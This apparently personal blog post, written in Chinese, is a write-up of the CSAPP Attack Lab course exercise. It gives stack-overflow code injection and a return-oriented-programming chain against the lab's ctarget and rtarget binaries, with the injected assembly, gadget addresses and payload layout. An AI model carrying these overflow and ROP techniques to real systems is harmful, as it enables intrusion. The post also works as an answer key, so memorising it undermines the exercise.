+++
date = "2025-05-28T14:42:00+08:00"
# lastmod = "2025-07-22T14:41:05+08:00"
draft = false
title = "CSAPP Attack Lab WriteUp"
# summary = ""
+++

## ctarget

```asm
0000000000401e45 <getbuf>:
  401e45:	f3 0f 1e fa          	endbr64 
  401e49:	48 83 ec 38          	sub    $0x38,%rsp
  401e4d:	48 89 e7             	mov    %rsp,%rdi
  401e50:	e8 ad 02 00 00       	call   402102 <Gets>
  401e55:	b8 01 00 00 00       	mov    $0x1,%eax
  401e5a:	48 83 c4 38          	add    $0x38,%rsp
  401e5e:	c3                   	ret
```

`getbuf` 的栈帧大小为 56 byte，将相关的函数逆向分析后可以得到伪代码。

```c
int getbuf(){
    char dest[56];
    Gets(dest);
    return 1;
}

static gets_cnt;
extren FILE* infile;

// write string to memory from dest till read EOF/'\n'
char* Gets(char* dest){
    gets_cnt=0;
    for(auto d=dest;;){
        char ret=getc(infile);
        if(ret==EOF||ret=='\n'){
            break;
        }
        *d=ret;
        save_char(ret);
        d++;
    }
    return dest;
}
```

### level 1

目标是 touch1 (401e5f)，根据对 `getbuf` 的分析可知只需构建一个字符串，包含 56 byte 无效字符串和一个 8 byte 的地址即可，地址会覆盖返回地址，此时地址需要注意高低位方向的问题。

### level 2

目标是 touch2 (401e93)，根据要求可知，需要在跳转前执行一部分程序，由于 `ctarget` 的栈可执行，所以可以直接将相应汇编的 hex 值写入栈中，然后跳转到写入字符串时的栈顶，执行操作后进行第二次跳转。

另外由于在 .s 文件中指定超出范围的地址应该有点问题，所以改用 push + ret 的方式。

```asm
mov $0x2db19fd3,%rdi
push $0x401e93
ret
```

### level 3

目标是 touch3 (401fb0)，要求给出一个 `char *` 指针，只需将 cookie 转换为 hex 写入栈中，再将相应的地址作为参数传递即可，记得考虑c字符串末尾的`\0`，第二个 `push $0x0` 是多余的。

```asm
push $0x0
push $0x31626432
movl $0x33646639,0x4(%rsp)
mov %rsp,%rdi
push $0x0
push $0x401fb0
ret
```

当然这里也可以通过将 cookie 构造到攻击字符中实现数据的写入。

另外不知道为什么，程序执行的时候会出现段错误，但是在`-q`下没有问题，而且计分板也正常记分，可能是服务器的问题。

## rtarget

`rtarget` 有栈随机化和栈不可执行两个保护，所以攻击思路从注入代码并执行变成了通过程序自带的代码进行攻击，更具体地来讲就是利用 ret 会跳转到栈顶地址指向的位置，将原有程序的代码（更具体的，可执行的字节）拼凑起来，形成期望的攻击代码。

### level 2

本题需要干两件事：

1. 将 cookie 存到 `%rdi`
2. 调用 `touch2`

由于不能直接注入执行，所以可以利用 pop 的方式，将 cookie 写入到栈上后写入到寄存器中；另外由于找不到 `pop %rdi ret` 的代码，所以用一个寄存器中转，这里使用 `%rax`。

```asm
pop %rax
mov %rax,%rdi
```

对于调用 `touch2`，只需要像 `ctarget` 一样将相应的地址写入栈中，然后返回即可。

所以最终的汇编代码为：

```asm
(1)
pop %rax
ret
(2)
mov %rax,%rdi
ret
```

经过查找，第一部分的地址为 402087，第二部分为 40207b，由此构建了相应的 hex 字符串，内容依次为：

| No. | 内容          | 大小   |
| --- | ------------- | ------ |
| 1   | 任意内容      | 56byte |
| 2   | 第一部分地址  | 8byte  |
| 3   | cookie        | 8byte  |
| 4   | 第二部分地址  | 8type  |
| 5   | `touch2` 地址 | 8byte  |

即解。
